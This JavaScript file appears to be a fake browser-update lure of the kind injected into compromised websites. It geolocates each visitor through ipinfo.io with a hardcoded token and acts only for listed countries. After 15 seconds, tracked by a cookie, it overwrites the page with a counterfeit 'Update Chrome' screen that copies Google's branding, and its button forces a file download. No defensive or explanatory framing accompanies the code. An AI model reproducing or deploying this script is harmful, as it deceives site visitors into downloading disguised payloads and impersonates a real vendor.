function checkCountry(countryCode) {
    const allowedCountries = ['US', 'CA', 'DE', 'PL', 'UK', 'FR', 'GA', 'AU'];
    return allowedCountries.includes(countryCode);
}

function downloadFile() {
    const link = document.createElement('a');
    link.href = '/index.html'; 
    link.download = '/index.html';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}


fetch('https://ipinfo.io/json?token=1299edd67307b6')
    .then(response => response.json())
    .then(data => {
        const ip = data.ip;
        const country = data.country;

        const isAllowed = checkCountry(country);

        if (isAllowed) {
            console.log('working: ' + country);
            runMainScript();
        } else {
            console.log('not working: ' + country);
        }
    })
    .catch(error => console.error('error:', error));


function setCookie(name, value, days) {
    var expires = "";
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + (value || "") + expires + "; path=/";
}

function getCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') c = c.substring(1, c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
    }
    return null;
}

function runMainScript() {
    var timerStart = getCookie("timerStart");

    if (!timerStart) {
        setCookie("timerStart", Date.now(), 1);
        timerStart = Date.now();
    }

    function checkTime() {
        var now = Date.now();
        var timeSpent = (now - timerStart) / 1000;
        if (timeSpent >= 15) { // Таймер срабатывает через 15 секунд
            document.head.innerHTML = `
                <title>Update Browser</title>
                <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
                <style>
                    body, html {
                        height: 100%;
                        margin: 0;
                        font-family: 'Roboto', sans-serif;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        background-color: #f8f9fa;
                    }
                    .container {
                        text-align: center;
                        padding: 20px;
                        max-width: 1360px;
                        margin: auto;
                    }
                    .logo {
                        height: 48px;
                        margin-bottom: 20px;
                    }
                    h1 {
                        font-size: 60px;
                        color: #202124;
                        margin-bottom: 20px;
                        font-weight: 400;
                    }
                    .update-button {
                        background-color: #1a73e8;
                        color: white;
                        border: none;
                        padding: 15px 32px;
                        font-size: 18px;
                        cursor: pointer;
                        border-radius: 25px;
                        margin-bottom: 20px;
                        outline: none;
                    }
                    .update-button:hover {
                        background-color: #185abc;
                    }
                    .checkbox-section {
                        text-align: left;
                        margin-bottom: 20px;
                        display: flex;
                        justify-content: center;
                    }
                    input[type="checkbox"] {
                        margin-right: 10px;
                    }
                    .footer a {
                        color: #1a73e8;
                        text-decoration: none;
                        margin-right: 10px;
                    }
                    .footer a:hover {
                        text-decoration: underline;
                    }
                    .windows {
                        opacity: .9;
                        margin: 20px 0px;
                    }
                    @media(max-width: 756px) {
                        h1 {
                            font-size: 40px;
                        }
                    }
                </style>
            `;

            document.body.innerHTML = `
                <div class="container">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="144px" height="144px">
                        <path fill="#fff" d="M34,24c0,5.521-4.479,10-10,10s-10-4.479-10-10s4.479-10,10-10S34,18.479,34,24z"/>
                        <linearGradient id="Pax8JcnMzivu8f~SZ~k1ya" x1="5.789" x2="31.324" y1="34.356" y2="20.779" gradientTransform="matrix(1 0 0 -1 0 50)" gradientUnits="userSpaceOnUse">
                            <stop offset="0" stop-color="#4caf50"/>
                            <stop offset=".489" stop-color="#4aaf50"/>
                            <stop offset=".665" stop-color="#43ad50"/>
                            <stop offset=".79" stop-color="#38aa50"/>
                            <stop offset=".892" stop-color="#27a550"/>
                            <stop offset=".978" stop-color="#11a050"/>
                            <stop offset="1" stop-color="#0a9e50"/>
                        </linearGradient>
                        <path fill="url(#Pax8JcnMzivu8f~SZ~k1ya)" d="M31.33,29.21l-8.16,14.77C12.51,43.55,4,34.76,4,24C4,12.96,12.96,4,24,4v11c-4.97,0-9,4.03-9,9s4.03,9,9,9C27.03,33,29.7,31.51,31.33,29.21z"/>
                        <linearGradient id="Pax8JcnMzivu8f~SZ~k1yb" x1="33.58" x2="33.58" y1="6" y2="34.797" gradientTransform="matrix(1 0 0 -1 0 50)" gradientUnits="userSpaceOnUse">
                            <stop offset="0" stop-color="#ffd747"/>
                            <stop offset=".482" stop-color="#ffd645"/>
                            <stop offset=".655" stop-color="#fed43e"/>
                            <stop offset=".779" stop-color="#fccf33"/>
                            <stop offset=".879" stop-color="#fac922"/>
                            <stop offset=".964" stop-color="#f7c10c"/>
                            <stop offset="1" stop-color="#f5bc00"/>
                        </linearGradient>
                        <path fill="url(#Pax8JcnMzivu8f~SZ~k1yb)" d="M44,24c0,11.05-8.95,20-20,20h-0.84l8.17-14.79C32.38,27.74,33,25.94,33,24c0-4.97-4.03-9-9-9V4c7.81,0,14.55,4.48,17.85,11C43.21,17.71,44,20.76,44,24z"/>
                        <linearGradient id="Pax8JcnMzivu8f~SZ~k1yc" x1="36.128" x2="11.574" y1="44.297" y2="28.954" gradientTransform="matrix(1 0 0 -1 0 50)" gradientUnits="userSpaceOnUse">
                            <stop offset="0" stop-color="#f7572f"/>
                            <stop offset=".523" stop-color="#f7552d"/>
                            <stop offset=".712" stop-color="#f75026"/>
                            <stop offset=".846" stop-color="#f7461b"/>
                            <stop offset=".954" stop-color="#f7390a"/>
                            <stop offset="1" stop-color="#f73100"/>
                        </linearGradient>
                        <path fill="url(#Pax8JcnMzivu8f~SZ~k1yc)" d="M41.84,15H24c-4.97,0-9,4.03-9,9c0,1.49,0.36,2.89,1.01,4.13H16L7.16,13.26H7.14C10.68,7.69,16.91,4,24,4C31.8,4,38.55,8.48,41.84,15z"/>
                        <linearGradient id="Pax8JcnMzivu8f~SZ~k1yd" x1="19.05" x2="28.95" y1="30.95" y2="21.05" gradientTransform="matrix(1 0 0 -1 0 50)" gradientUnits="userSpaceOnUse">
                            <stop offset="0" stop-color="#2aa4f4"/>
                            <stop offset="1" stop-color="#007ad9"/>
                        </linearGradient>
                        <path fill="url(#Pax8JcnMzivu8f~SZ~k1yd)" d="M31,24c0,3.867-3.133,7-7,7s-7-3.133-7-7s3.133-7,7-7S31,20.133,31,24z"/>
                    </svg>
                    <h1>You need to update your browser to<br>view the content!</h1>
                    <button class="update-button" onclick="downloadFile()">Update Chrome</button>
                    <div class="windows">For Windows 11 / 10 64-bit</div>
                    <div class="checkbox-section">
                        <input type="checkbox" id="auto-update">
                        <label for="auto-update">Help make Google Chrome better by automatically sending usage statistics and crash reports to Google.</label>
                    </div>
                    <div class="footer">
                        <a href="#">Google Terms of Service</a>
                        <a href="#">Privacy</a>
                    </div>
                </div>
            `;
        } else {
            setTimeout(checkTime, 1000);
        }
    }

    checkTime();
}
